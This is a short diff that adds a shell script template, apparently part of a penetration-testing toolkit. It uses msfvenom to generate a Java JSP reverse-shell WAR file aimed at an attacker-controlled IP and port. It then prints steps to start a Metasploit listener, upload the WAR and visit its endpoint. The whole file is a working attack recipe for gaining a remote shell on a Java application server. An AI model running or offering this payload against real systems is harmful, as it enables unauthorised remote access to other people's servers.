@@ -1,0 +1,9 @@
+mkdir -p packstation/outbound; echo 'msfvenom creates the payload. Please wait...'; \
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<%=$(esh variables/attacker_ip)%> LPORT=<%=$(esh variables/shell_port)%> -f war > packstation/outbound/revshell.war
+echo '================================================================'; \
+echo '                      ------Listener------                      '; \
+echo '1. Start listener: <% echo $(esh scripts/listener-msf-multi-handler-linux-x64-meterpreter-nonstaged) %>'; \
+echo '================================================================'; \
+echo '                      ------Exploitation------                      '; \
+echo '2. Upload WAR file and visit endpoint'; \
+echo '================================================================';
